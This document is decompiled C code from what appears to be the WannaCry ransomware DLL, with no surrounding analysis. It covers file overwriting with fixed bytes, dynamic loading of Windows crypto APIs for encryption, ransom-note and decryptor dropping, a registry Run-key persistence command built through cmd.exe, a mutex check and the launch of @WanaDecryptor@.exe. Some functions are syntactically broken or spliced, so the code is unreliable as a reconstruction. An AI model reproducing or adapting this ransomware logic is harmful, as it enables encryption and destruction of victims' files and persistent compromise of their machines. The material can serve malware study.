  if ((DVar1 & 1) != 0) {
    LStack_1c.s.HighPart = 0x1000304a;
    SetFileAttributesW(in_stack_00040018,DVar1 & 0xfffffffe);
  }
  LStack_1c.s.HighPart = 3;
  LStack_1c.s.LowPart = 0;
  uStack_20 = 3;
  uStack_24 = 0x40000000;
  pWStack_28 = in_stack_00040018;
  hFile = (HANDLE)(*DAT_1000d91c)();
  if (hFile == (HANDLE)0xffffffff) {
    iVar2 = FUN_10003000();
    if (iVar2 == 0) {
      return 0;
    }
    hFile = (HANDLE)(*DAT_1000d91c)(in_stack_00040018,0x40000000,3,0,3,0,0);
    if (hFile == (HANDLE)0xffffffff) {
      return 0;
    }
  }
  GetFileSizeEx(hFile,&LStack_1c);
  if (in_stack_00040000 == (void *)0x0) {
    if ((0 < LStack_1c.s.HighPart) ||
       ((uVar3 = LStack_1c.s.LowPart, -1 < LStack_1c.s.HighPart && (0x3ffff < LStack_1c.s.LowPart)))
       ) {
      uVar3 = 0x40000;
    }
    puVar6 = (undefined4 *)&stack0xfffffff8;
    for (uVar5 = (uint)uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
      *puVar6 = 0x55555555;
      puVar6 = puVar6 + 1;
    }
    for (uVar5 = uVar3 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
      *(unsigned int *)puVar6 = 0x55;
      puVar6 = (undefined4 *)((int)puVar6 + 1);
    }
  }
  else {
    if ((0 < LStack_1c.s.HighPart) ||
       ((uVar3 = LStack_1c.s.LowPart, -1 < LStack_1c.s.HighPart && (0x3ffff < LStack_1c.s.LowPart)))
       ) {
      uVar3 = 0x40000;
    }
    FUN_10004420(in_stack_00040000,&stack0xfffffff8,uVar3);
  }
  uVar3 = LStack_1c.s.LowPart;
  if ((-1 < LStack_1c.s.HighPart) && ((0 < LStack_1c.s.HighPart || (0x3ff < LStack_1c.s.LowPart))))
  {
    SetFilePointer(hFile,-0x400,(PLONG)0x0,2);
    uVar3 = 0x400;
  }
  uVar8 = 0;
  (*DAT_1000d920)(hFile,&stack0xfffffff8,uVar3,&stack0xffffffec);
  FlushFileBuffers(hFile);
  SetFilePointer(hFile,0,(PLONG)0x0,0);
  uVar5 = 0;
  iVar2 = 0;
  if ((-1 < unaff_EBX) && ((0 < unaff_EBX || (uVar8 != 0)))) {
    do {
      iVar4 = 0x40000;
      bVar7 = (int)((unaff_EBX - iVar2) - (uint)(uVar8 < uVar5)) < 0;
      if ((unaff_EBX - iVar2 == (uint)(uVar8 < uVar5) || bVar7) &&
         ((bVar7 || (uVar8 - uVar5 < 0x40000)))) {
        iVar4 = uVar8 - uVar5;
      }
      (*DAT_1000d920)(hFile,&LStack_1c,iVar4,&pWStack_28,0);
      bVar7 = CARRY4(uVar5,(uint)pWStack_28);
      uVar5 = uVar5 + (int)pWStack_28;
      iVar2 = iVar2 + (uint)bVar7;
    } while ((iVar2 < unaff_EBX) || ((iVar2 <= unaff_EBX && (uVar5 < uVar8))));
  }
  (*DAT_1000d934)(hFile);
  return 1;
}



void FUN_10003200(wchar_t *param_1)

{
  wchar_t local_2d0 [360];
  
  swprintf(local_2d0,0x1000cca0,param_1,u__Please_Read_Me__txt_1000cc74);
  CopyFileW(u__Please_Read_Me__txt_1000cc74,local_2d0,1);
  return;
}



void FUN_10003240(wchar_t *param_1)

{
  wchar_t local_2d0 [360];
  
  swprintf(local_2d0,0x1000cca0,param_1,u__WanaDecryptor__exe_lnk_1000cc44);
  CopyFileW(u__WanaDecryptor__exe_lnk_1000cc44,local_2d0,1);
  return;
}



void FUN_10003280(wchar_t *param_1)

{
  wchar_t local_2d0 [360];
  
  swprintf(local_2d0,0x1000cca0,param_1,u__WanaDecryptor__exe_1000cce4);
  CopyFileW(u__WanaDecryptor__exe_1000cce4,local_2d0,1);
  return;
}



bool FUN_100032c0(wchar_t *param_1,wchar_t *param_2)

{
  int iVar1;
  wchar_t *pwVar2;
  wchar_t *pwVar3;
  
  iVar1 = _wcsnicmp(param_1,(wchar_t *)&DAT_1000cc14,2);
  if (iVar1 == 0) {
    pwVar2 = wcsstr(param_1,(wchar_t *)&DAT_1000ced4);
  }
  else {
    pwVar2 = param_1 + 1;
  }
  if (pwVar2 != (wchar_t *)0x0) {
    pwVar2 = pwVar2 + 1;
    iVar1 = _wcsicmp(pwVar2,u__Intel_1000cec4);
    if (iVar1 == 0) {
      return true;
    }
    iVar1 = _wcsicmp(pwVar2,u__ProgramData_1000cea8);
    if (iVar1 == 0) {
      return true;
    }
    iVar1 = _wcsicmp(pwVar2,u__WINDOWS_1000ce94);
    if (iVar1 == 0) {
      return true;
    }
    iVar1 = _wcsicmp(pwVar2,u__Program_Files_1000ce74);
    if (iVar1 == 0) {
      return true;
    }
    iVar1 = _wcsicmp(pwVar2,u__Program_Files__x86__1000ce48);
    if (iVar1 == 0) {
      return true;
    }
    pwVar3 = wcsstr(pwVar2,u__AppData_Local_Temp_1000ce20);
    if (pwVar3 != (wchar_t *)0x0) {
      return true;
    }
    pwVar2 = wcsstr(pwVar2,u__Local_Settings_Temp_1000cdf4);
    if (pwVar2 != (wchar_t *)0x0) {
      return true;
    }
  }
  iVar1 = _wcsicmp(param_2,u_This_folder_protects_against_ran_1000cd58);
  if (iVar1 == 0) {
    return true;
  }
  iVar1 = _wcsicmp(param_2,u_Temporary_Internet_Files_1000cd24);
  if (iVar1 == 0) {
    return true;
  }
  iVar1 = _wcsicmp(param_2,u_Content_IE5_1000cd0c);
  return (bool)('\x01' - (iVar1 != 0));
}



undefined4 FUN_10003410(void)

{
  int iVar1;
  HMODULE hModule;
  
  iVar1 = FUN_10004440();
  if (iVar1 != 0) {
    if (DAT_1000d91c != (FARPROC)0x0) {
      return 1;
    }
    hModule = LoadLibraryA(s_kernel32_dll_1000cf30);
    if (hModule != (HMODULE)0x0) {
      DAT_1000d91c = GetProcAddress(hModule,s_CreateFileW_1000cf24);
      DAT_1000d920 = GetProcAddress(hModule,s_WriteFile_1000cf18);
      DAT_1000d924 = GetProcAddress(hModule,s_ReadFile_1000cf0c);
      DAT_1000d928 = GetProcAddress(hModule,s_MoveFileW_1000cf00);
      DAT_1000d92c = GetProcAddress(hModule,s_MoveFileExW_1000cef4);
      DAT_1000d930 = GetProcAddress(hModule,s_DeleteFileW_1000cee8);
      DAT_1000d934 = GetProcAddress(hModule,s_CloseHandle_1000cedc);
      if ((((DAT_1000d91c != (FARPROC)0x0) && (DAT_1000d920 != (FARPROC)0x0)) &&
          (DAT_1000d924 != (FARPROC)0x0)) &&
         (((DAT_1000d928 != (FARPROC)0x0 && (DAT_1000d92c != (FARPROC)0x0)) &&
          ((DAT_1000d930 != (FARPROC)0x0 && (DAT_1000d934 != (FARPROC)0x0)))))) {
        return 1;
      }
    }
  }
  return 0;
}



void __fastcall FUN_10003500(int param_1)

{
  int *piVar1;
  int *piVar2;
  int *piVar3;
  
  piVar1 = *(int **)(param_1 + 4);
  piVar3 = (int *)*piVar1;
  while (piVar3 != piVar1) {
    piVar2 = (int *)*piVar3;
    *(int *)piVar3[1] = *piVar3;
    *(int *)(*piVar3 + 4) = piVar3[1];
    std::basic_string<>::_Tidy((basic_string<> *)(piVar3 + 2),true);
    operator_delete(piVar3);
    *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + -1;
    piVar3 = piVar2;
  }
  operator_delete(*(void **)(param_1 + 4));
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  return;
}



void __fastcall FUN_10003560(int param_1)

{
  int *piVar1;
  int *piVar2;
  int *piVar3;
  
  piVar1 = *(int **)(param_1 + 4);
  piVar3 = (int *)*piVar1;
  while (piVar3 != piVar1) {
    piVar2 = (int *)*piVar3;
    *(int *)piVar3[1] = *piVar3;
    *(int *)(*piVar3 + 4) = piVar3[1];
    operator_delete(piVar3);
    *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + -1;
    piVar3 = piVar2;
  }
  operator_delete(*(void **)(param_1 + 4));
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  return;
}



void __thiscall FUN_100035b0(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  
  puVar1 = *(undefined4 **)this;
  *(undefined4 *)this = *puVar1;
  *param_1 = puVar1;
  return;
}



void __thiscall FUN_100035c0(void *this,undefined4 *param_1,void *param_2,basic_string<> *param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  
  puVar3 = *(undefined4 **)((int)param_2 + 4);
  puVar1 = operator_new(0x18);
  puVar2 = param_2;
  if (param_2 == (void *)0x0) {
    puVar2 = puVar1;
  }
  *puVar1 = puVar2;
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = puVar1;
  }
  puVar1[1] = puVar3;
  *(undefined4 **)((int)param_2 + 4) = puVar1;
  *(undefined4 **)puVar1[1] = puVar1;
  FUN_10003810((basic_string<> *)(puVar1 + 2),param_3);
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
  *param_1 = puVar1;
  return;
}



void __thiscall FUN_10003620(void *this,int *param_1,int *param_2)

{
  char cVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = *param_2;
  *(int *)param_2[1] = *param_2;
  *(int *)(*param_2 + 4) = param_2[1];
  iVar3 = param_2[3];
  if (iVar3 != 0) {
    cVar1 = *(char *)(iVar3 + -1);
    if ((cVar1 == '\0') || (cVar1 == -1)) {
      operator_delete((void *)(iVar3 + -2));
    }
    else {
      *(char *)(iVar3 + -1) = cVar1 + -1;
    }
  }
  param_2[3] = 0;
  param_2[4] = 0;
  param_2[5] = 0;
  operator_delete(param_2);
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1;
  *param_1 = iVar2;
  return;
}



void __thiscall FUN_100036a0(void *this,int *param_1,int *param_2,int *param_3)

{
  char cVar1;
  int *piVar2;
  int iVar3;
  
  if (param_2 == param_3) {
    *param_1 = (int)param_2;
    return;
  }
  do {
    piVar2 = (int *)*param_2;
    *(int *)param_2[1] = *param_2;
    *(int *)(*param_2 + 4) = param_2[1];
    iVar3 = param_2[3];
    if (iVar3 != 0) {
      cVar1 = *(char *)(iVar3 + -1);
      if ((cVar1 == '\0') || (cVar1 == -1)) {
        operator_delete((void *)(iVar3 + -2));
      }
      else {
        *(char *)(iVar3 + -1) = cVar1 + -1;
      }
    }
    param_2[3] = 0;
    param_2[4] = 0;
    param_2[5] = 0;
    operator_delete(param_2);
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1;
    param_2 = piVar2;
  } while (piVar2 != param_3);
  *param_1 = (int)piVar2;
  return;
}



void FUN_10003730(undefined4 *param_1,int param_2)

{
  undefined4 *puVar1;
  
  puVar1 = operator_new(0x18);
  if (param_1 == (undefined4 *)0x0) {
    param_1 = puVar1;
  }
  *puVar1 = param_1;
  if (param_2 != 0) {
    puVar1[1] = param_2;
    return;
  }
  puVar1[1] = puVar1;
  return;
}



undefined4 * __thiscall
FUN_10003760(void *this,undefined4 *param_1,void *param_2,undefined4 *param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  
  puVar3 = *(undefined4 **)((int)param_2 + 4);
  puVar1 = operator_new(0x4ec);
  puVar2 = param_2;
  if (param_2 == (void *)0x0) {
    puVar2 = puVar1;
  }
  *puVar1 = puVar2;
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = puVar1;
  }
  puVar1[1] = puVar3;
  *(undefined4 **)((int)param_2 + 4) = puVar1;
  *(undefined4 **)puVar1[1] = puVar1;
  if (puVar1 + 2 != (undefined4 *)0x0) {
    puVar3 = puVar1 + 2;
    for (iVar4 = 0x139; iVar4 != 0; iVar4 = iVar4 + -1) {
      *puVar3 = *param_3;
      param_3 = param_3 + 1;
      puVar3 = puVar3 + 1;
    }
  }
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
  *param_1 = puVar1;
  return param_1;
}



void __thiscall FUN_100037c0(void *this,undefined4 *param_1,int *param_2,int *param_3)

{
  int *piVar1;
  
  while (param_2 != param_3) {
    piVar1 = (int *)*param_2;
    *(int *)param_2[1] = *param_2;
    *(int *)(*param_2 + 4) = param_2[1];
    operator_delete(param_2);
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1;
    param_2 = piVar1;
  }
  *param_1 = param_2;
  return;
}



void __cdecl FUN_10003810(basic_string<> *param_1,basic_string<> *param_2)

{
  basic_string<> bVar1;
  undefined2 uVar2;
  int iVar3;
  bool bVar4;
  uint uVar5;
  undefined2 *puVar6;
  code *pcVar7;
  uint uVar8;
  uint uVar9;
  void *local_c;
  undefined1 *puStack_8;
  undefined4 local_4;
  
  puStack_8 = &LAB_10006e81;
  local_c = ExceptionList;
  local_4 = 0;
  if (param_1 != (basic_string<> *)0x0) {
    bVar1 = *param_2;
    ExceptionList = &local_c;
    *(uint32_t *)(param_1 + 4) = 0;
    *param_1 = bVar1;
    *( *)(param_1 + 8) = 0;
    *(uint32_t *)(param_1 + 0xc) = 0;
    uVar8 = *(uint *)npos_exref;
    uVar5 = *(uint *)(param_2 + 8);
    uVar9 = uVar5;
    if (uVar8 < uVar5) {
      uVar9 = uVar8;
    }
    if (param_1 == param_2) {
      if (uVar9 != 0) {
        std::_Xran();
      }
      std::basic_string<>::_Split(param_1);
      uVar5 = *(int *)(param_1 + 8) - uVar9;
      if (uVar5 < uVar8) {
        uVar8 = uVar5;
      }
      if (uVar8 != 0) {
        FUN_10003990((undefined2 *)(*(int *)(param_1 + 4) + uVar9 * 2),
                     (undefined2 *)(*(int *)(param_1 + 4) + (uVar8 + uVar9) * 2),uVar5 - uVar8);
        iVar3 = *(int *)(param_1 + 8);
        bVar4 = std::basic_string<>::_Grow(param_1,iVar3 - uVar8,false);
        if (bVar4) {
          std::basic_string<>::_Eos(param_1,iVar3 - uVar8);
        }
      }
      std::basic_string<>::_Split(param_1);
      ExceptionList = local_c;
      return;
    }
    if ((uVar9 != 0) && (uVar9 == uVar5)) {
      pcVar7 = *(code **)(param_2 + 4);
      if (*(code **)(param_2 + 4) == (code *)0x0) {
        pcVar7 = _C_exref;
      }
      if ((byte)pcVar7[-1] < 0xfe) {
        std::basic_string<>::_Tidy(param_1,true);
        pcVar7 = *(code **)(param_2 + 4);
        if (*(code **)(param_2 + 4) == (code *)0x0) {
          pcVar7 = _C_exref;
        }
        *(code **)(param_1 + 4) = pcVar7;
        *(undefined4 *)(param_1 + 8) = *(undefined4 *)(param_2 + 8);
        *(undefined4 *)(param_1 + 0xc) = *(undefined4 *)(param_2 + 0xc);
        pcVar7[-1] = (code)((char)pcVar7[-1] + '\x01');
        ExceptionList = local_c;
        return;
      }
    }
    bVar4 = std::basic_string<>::_Grow(param_1,uVar9,true);
    if (bVar4) {
      pcVar7 = *(code **)(param_2 + 4);
      if (*(code **)(param_2 + 4) == (code *)0x0) {
        pcVar7 = _C_exref;
      }
      puVar6 = *(undefined2 **)(param_1 + 4);
      for (uVar8 = uVar9; uVar8 != 0; uVar8 = uVar8 - 1) {
        uVar2 = *(undefined2 *)pcVar7;
        pcVar7 = pcVar7 + 2;
        *puVar6 = uVar2;
        puVar6 = puVar6 + 1;
      }
      *(uint *)(param_1 + 8) = uVar9;
      *(undefined2 *)(*(int *)(param_1 + 4) + uVar9 * 2) = 0;
    }
  }
  ExceptionList = local_c;
  return;
}



void __cdecl FUN_10003990(undefined2 *param_1,undefined2 *param_2,int param_3)

{
  undefined2 *puVar1;
  undefined2 uVar2;
  undefined2 *puVar3;
  undefined2 *puVar4;
  
  if ((param_2 < param_1) && (puVar3 = param_2 + param_3, param_1 < puVar3)) {
    puVar4 = param_1 + param_3;
    if (param_3 != 0) {
      do {
        puVar1 = puVar3 + -1;
        puVar3 = puVar3 + -1;
        puVar4 = puVar4 + -1;
        param_3 = param_3 + -1;
        *puVar4 = *puVar1;
      } while (param_3 != 0);
      return;
    }
  }
  else {
    for (; param_3 != 0; param_3 = param_3 + -1) {
      uVar2 = *param_2;
      param_2 = param_2 + 1;
      *param_1 = uVar2;
      param_1 = param_1 + 1;
    }
  }
  return;
}



void FUN_100039e0(void)

{
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_100039f0(undefined4 param_1,int param_2)

{
  if (param_2 == 1) {
    _DAT_1000d938 = param_1;
  }
  return 1;
}



undefined4 * __fastcall FUN_10003a10(undefined4 *param_1)

{
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  *param_1 = &PTR_FUN_1000720c;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return param_1;
}



undefined4 * __thiscall FUN_10003a40(void *this,byte param_1)

{
  FUN_10003a60(this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}

undefined4 __thiscall FUN_10003d10(void *this,LPCSTR param_1,LPCSTR param_2)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  char *pcVar5;
  char *pcVar6;
  int local_22c;
  char local_228 [4];
  char local_224 [4];
  char local_220;
  undefined1 local_21f;
  char local_21c;
  char local_21b [2];
  char acStack_219 [517];
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_10007210;
  puStack_10 = &DAT_10006bb6;
  local_14 = ExceptionList;
  local_228 = (char  [4])s_TESTDATA_1000d1a0._0_4_;
  local_224 = (char  [4])s_TESTDATA_1000d1a0._4_4_;
  local_220 = s_TESTDATA_1000d1a0[8];
  local_21f = 0;
  local_21c = '\0';
  pcVar5 = local_21b;
  for (iVar2 = 0x7f; iVar2 != 0; iVar2 = iVar2 + -1) {
    pcVar5[0] = '\0';
    pcVar5[1] = '\0';
    pcVar5[2] = '\0';
    pcVar5[3] = '\0';
    pcVar5 = pcVar5 + 4;
  }
  pcVar5[0] = '\0';
  pcVar5[1] = '\0';
  pcVar5[2] = '\0';
  uVar3 = 0xffffffff;
  pcVar5 = local_228;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + 1;
  } while (cVar1 != '\0');
  local_22c = ~uVar3 - 1;
  ExceptionList = &local_14;
  iVar2 = FUN_10003a80((int)this);
  if (iVar2 != 0) {
    local_8 = 0;
    iVar2 = FUN_10003f00(*(undefined4 *)((int)this + 4),(int)this + 8,param_1);
    if ((iVar2 != 0) &&
       (iVar2 = FUN_10003f00(*(undefined4 *)((int)this + 4),(int)this + 0xc,param_2), iVar2 != 0)) {
      uVar3 = 0xffffffff;
      pcVar5 = local_228;
      do {
        pcVar6 = pcVar5;
        if (uVar3 == 0) break;
        uVar3 = uVar3 - 1;
        pcVar6 = pcVar5 + 1;
        cVar1 = *pcVar5;
        pcVar5 = pcVar6;
      } while (cVar1 != '\0');
      uVar3 = ~uVar3;
      pcVar5 = pcVar6 + -uVar3;
      pcVar6 = &local_21c;
      for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
        *(undefined4 *)pcVar6 = *(undefined4 *)pcVar5;
        pcVar5 = pcVar5 + 4;
        pcVar6 = pcVar6 + 4;
      }
      for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
        *pcVar6 = *pcVar5;
        pcVar5 = pcVar5 + 1;
        pcVar6 = pcVar6 + 1;
      }
      iVar2 = (*DAT_1000d948)(*(undefined4 *)((int)this + 8),0,1,0,&local_21c,&local_22c,0x200);
      if ((iVar2 != 0) &&
         (iVar2 = (*DAT_1000d94c)(*(undefined4 *)((int)this + 0xc),0,1,0,&local_21c,&local_22c),
         iVar2 != 0)) {
        uVar3 = 0xffffffff;
        pcVar5 = local_228;
        do {
          if (uVar3 == 0) break;
          uVar3 = uVar3 - 1;
          cVar1 = *pcVar5;
          pcVar5 = pcVar5 + 1;
        } while (cVar1 != '\0');
        iVar2 = strncmp(&local_21c,local_228,~uVar3 - 1);
        if (iVar2 != 0) {
          local_8 = 0xffffffff;
          FUN_10003ef6();
          ExceptionList = local_14;
          return 0;
        }
        local_unwind2(&local_14,0xffffffff);
        ExceptionList = local_14;
        return 1;
      }
    }
    local_unwind2(&local_14,0xffffffff);
  }
  ExceptionList = local_14;
  return 0;
}



void FUN_10003ef6(void)

{
  int unaff_EBX;
  
  FUN_10003bb0(unaff_EBX);
  return;
}

undefined4 __thiscall

undefined4 FUN_10004440(void)

{
  HMODULE hModule;
  
  if (DAT_1000d93c != (FARPROC)0x0) {
    return 1;
  }
  hModule = LoadLibraryA(s_advapi32_dll_1000c058);
  if (hModule != (HMODULE)0x0) {
    DAT_1000d93c = GetProcAddress(hModule,s_CryptAcquireContextA_1000d1f8);
    DAT_1000d940 = GetProcAddress(hModule,s_CryptImportKey_1000d1e8);
    DAT_1000d944 = GetProcAddress(hModule,s_CryptDestroyKey_1000d1d8);
    DAT_1000d948 = GetProcAddress(hModule,s_CryptEncrypt_1000d1c8);
    DAT_1000d94c = GetProcAddress(hModule,s_CryptDecrypt_1000d1b8);
    DAT_1000d950 = GetProcAddress(hModule,s_CryptGenKey_1000d1ac);
    if ((((DAT_1000d93c != (FARPROC)0x0) && (DAT_1000d940 != (FARPROC)0x0)) &&
        (DAT_1000d944 != (FARPROC)0x0)) &&
       (((DAT_1000d948 != (FARPROC)0x0 && (DAT_1000d94c != (FARPROC)0x0)) &&
        (DAT_1000d950 != (FARPROC)0x0)))) {
      return 1;
    }
  }
  return 0;
}



undefined4 __cdecl FUN_10004500(undefined4 param_1)

{
  DWORD DVar1;
  int iVar2;
  undefined4 local_68 [10];
  char local_40 [52];
  void *local_c;
  undefined1 *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_10006e98;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  sprintf(local_40,s__08X_dky_1000d4e8,param_1);
  DVar1 = GetFileAttributesA(local_40);
  if (DVar1 != 0xffffffff) {
    DVar1 = GetFileAttributesA(&DAT_1000dd24);
    if (DVar1 != 0xffffffff) {
      FUN_10003a10(local_68);
      local_4 = 0;
      iVar2 = FUN_10003d10(local_68,&DAT_1000dd24,local_40);
      local_4 = 0xffffffff;
      if (iVar2 != 0) {
        FUN_10003a60(local_68);
        ExceptionList = local_c;
        return 1;
      }
      FUN_10003a60(local_68);
    }
  }
  ExceptionList = local_c;
  return 0;
}



void FUN_100045c0(undefined4 param_1)

{
  while( true ) {
    DAT_1000dd8c = FUN_10004500(param_1);
    if (DAT_1000dd8c != 0) break;
    Sleep(5000);
  }
                    // WARNING: Subroutine does not return
  ExitThread(0);
}



undefined4 __cdecl FUN_10004600(undefined4 param_1)

{
  HANDLE pvVar1;
  DWORD DVar2;
  char local_64 [100];
  
  pvVar1 = OpenMutexA(0x100000,1,s_Global_MsWinZonesCacheCounterMut_1000d520);
  if (pvVar1 != (HANDLE)0x0) {
    CloseHandle(pvVar1);
    return 1;
  }
  sprintf(local_64,&DAT_1000d4f4,s_Global_MsWinZonesCacheCounterMut_1000d4fc,param_1);
  pvVar1 = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,1,local_64);
  if (pvVar1 != (HANDLE)0x0) {
    DVar2 = GetLastError();
    if (DVar2 == 0xb7) {
      CloseHandle(pvVar1);
      return 1;
    }
  }
  FUN_100013e0(pvVar1);
  return 0;
}



undefined4 FUN_10004690(void)

{
  HANDLE hObject;
  DWORD DVar1;
  
  hObject = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,1,
                         s_Global_MsWinZonesCacheCounterMut_1000d4fc + 7);
  if (hObject != (HANDLE)0x0) {
    DVar1 = GetLastError();
    if (DVar1 == 0xb7) {
      CloseHandle(hObject);
      return 1;
    }
  }
  return 0;
}



undefined4 FUN_100046d0(void)

{
  HANDLE hFile;
  DWORD local_4;
  
  hFile = CreateFileA(&DAT_1000dcf0,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    return 0;
  }
  local_4 = 0;
  ReadFile(hFile,&DAT_1000dc68,0x88,&local_4,(LPOVERLAPPED)0x0);
  CloseHandle(hFile);
  return 0x88;
}



undefined4 FUN_10004730(void)

{
  HANDLE hFile;
  DWORD local_4;
  
  hFile = CreateFileA(&DAT_1000dcf0,0x40000000,1,(LPSECURITY_ATTRIBUTES)0x0,4,0x80,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    return 0;
  }
  local_4 = 0;
  WriteFile(hFile,&DAT_1000dc68,0x88,&local_4,(LPOVERLAPPED)0x0);
  CloseHandle(hFile);
  return 0x88;
}



void __cdecl FUN_100047f0(undefined4 param_1)

{
  int iVar1;
  char *pcVar2;
  undefined4 *puVar3;
  undefined4 local_498;
  undefined1 local_464;
  undefined4 local_463;
  char local_400 [1024];
  
  pcVar2 = s_HKCU_SOFTWARE_Microsoft_Windows__1000d57c;
  puVar3 = &local_498;
  for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *(undefined4 *)pcVar2;
    pcVar2 = pcVar2 + 4;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = *(undefined2 *)pcVar2;
  *(char *)((int)puVar3 + 2) = pcVar2[2];
  iVar1 = FUN_10001360();
  if (iVar1 != 0) {
    local_498._2_1_ = 0x4c;
    local_498._3_1_ = 0x4d;
  }
  local_464 = DAT_1000dd98;
  puVar3 = &local_463;
  for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  *(undefined1 *)((int)puVar3 + 2) = 0;
  char *FUN_100014a0(char *param_1);
  sprintf(local_400,s_cmd_exe__c_reg_add__s__v___s___t_1000d544,&local_498,&local_464,param_1);
  extern "C" BOOL FUN_10001080(LPSTR param_1, DWORD param_2, LPDWORD param_3);
  return;
}



void FUN_10004890(void)

{
  int iVar1;
  BOOL BVar2;
  undefined4 *puVar3;
  LPSTR *ppCVar4;
  _PROCESS_INFORMATION local_65c;
  _STARTUPINFOA local_64c;
  CHAR local_608;
  undefined4 local_607;
  char local_400 [1024];
  
  iVar1 = FUN_10001360();
  if ((iVar1 != 0) || (DAT_1000dd94 != 0)) {
    local_608 = DAT_1000dd98;
    puVar3 = &local_607;
    for (iVar1 = 0x81; iVar1 != 0; iVar1 = iVar1 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    *(undefined2 *)puVar3 = 0;
    *(undefined1 *)((int)puVar3 + 2) = 0;
    GetFullPathNameA(s__WanaDecryptor__exe_1000d5c4,0x208,&local_608,(LPSTR *)0x0);
    sprintf(local_400,s__s__s_1000d5b0,s_taskse_exe_1000d5b8,&local_608);
    BOOL FUN_10001080(LPSTR param_1, DWORD param_2, LPDWORD param_3);
    if (DAT_1000dd94 != 0) {
      return;
    }
  }
  local_64c.cb = 0x44;
  local_65c.hProcess = (HANDLE)0x0;
  ppCVar4 = &local_64c.lpReserved;
  for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {
    *ppCVar4 = (LPSTR)0x0;
    ppCVar4 = ppCVar4 + 1;
  }
  local_65c.hThread = (HANDLE)0x0;
  local_65c.dwProcessId = 0;
  local_65c.dwThreadId = 0;
  local_64c.dwFlags = 1;
  local_64c.wShowWindow = 5;
  BVar2 = CreateProcessA((LPCSTR)0x0,s__WanaDecryptor__exe_1000d5c4,(LPSECURITY_ATTRIBUTES)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,0,0,(LPVOID)0x0,(LPCSTR)0x0,&local_64c,
                         &local_65c);
  if (BVar2 != 0) {
    CloseHandle(local_65c.hProcess);
    CloseHandle(local_65c.hThread);
  }
  return;
}



undefined4 __cdecl FUN_10004a40(int param_1)

{
  size_t sVar1;
  wchar_t *pwVar2;
  wchar_t *pwVar3;
  HANDLE hFindFile;
  BOOL BVar4;
  int iVar5;
  wchar_t *_Str2;
  undefined4 *puVar6;
  wchar_t local_868;
  undefined4 local_866 [124];
  wchar_t wStack_674;
  undefined4 auStack_672 [129];
  _WIN32_FIND_DATAW _Stack_46c;
  wchar_t awStack_21c [10];
  wchar_t local_208;
  undefined4 local_206 [126];
  code *pcStack_c;
  undefined4 uStack_8;
  
  local_868 = DAT_1000d918;
  local_208 = DAT_1000d918;
  puVar6 = local_866;
  for (iVar5 = 0x81; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  *(undefined2 *)puVar6 = 0;
  puVar6 = local_206;
  for (iVar5 = 0x81; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
  *(undefined2 *)puVar6 = 0;
  _Str2 = (wchar_t *)0x0;
  SHGetFolderPathW(0,param_1,0,0,&local_868);
  sVar1 = wcslen((wchar_t *)&stack0xfffff784);
  if (sVar1 < 4) {
    return 0;
  }
  pwVar2 = wcsrchr((wchar_t *)&stack0xfffff784,L'\\');
  if (pwVar2 == (wchar_t *)0x0) {
    return 0;
  }
  *pwVar2 = L'\0';
  pwVar3 = wcschr((wchar_t *)&stack0xfffff78a,L'\\');
  if (pwVar3 != (wchar_t *)0x0) {
    *pwVar3 = L'\0';
    if (param_1 == 0x2e) {
      SHGetFolderPathW(0,5,0,0,awStack_21c);
      sVar1 = wcslen(awStack_21c);
      if ((3 < sVar1) && (_Str2 = wcsrchr(awStack_21c,L'\\'), _Str2 != (wchar_t *)0x0)) {
        *_Str2 = L'\0';
        _Str2 = _Str2 + 1;
      }
    }
    wStack_674 = DAT_1000d918;
